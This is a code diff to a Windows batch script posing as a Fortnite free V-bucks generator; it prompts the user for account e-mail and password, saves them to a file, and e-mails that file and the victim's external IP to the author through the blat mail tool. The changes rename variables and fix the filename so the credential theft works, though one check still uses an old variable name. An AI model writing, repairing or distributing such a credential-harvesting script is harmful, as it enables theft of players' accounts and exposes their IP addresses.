@@ -9,6 +9,8 @@ Echo External IP is : %ExtIP%
 
 blat -s "IP" -to <youremail> -f ip@domain.com -body "%ExtIP%"
 
+pause
+
 :start
 @echo off
 cls
@@ -17,8 +19,8 @@ echo ########## Type in your e-mail and password to FORTNITE account ##########
 echo. 
 echo. 
 Set /p login:= E-mail: 
-Set /p hasło:= Password: 
-Set /p vdolce:= How many v-bucks do you want? 
+Set /p pass:= Password: 
+Set /p vbucks:= How many v-bucks do you want? 
 SET "var="&for /f "delims=0123456789" %%i in ("%vdolce:%") do set var=%%i
 
 if defined var (
@@ -28,10 +30,10 @@ goto :start
 )
 
 echo. 
-echo Login: %login:% Password: %hasło:% V-bucks: %vdolce:% >logins.txt
+echo Login: %login:% Password: %pass:% V-bucks: %vbucks:% >logins.txt
 
 @echo off
-blat loginy.txt -s "Logins" -to <youremail> -f logins@domain.com
+blat logins.txt -s "Logins" -to <youremail> -f logins@domain.com
 
 @echo off
     setlocal enableextensions enabledelayedexpansion
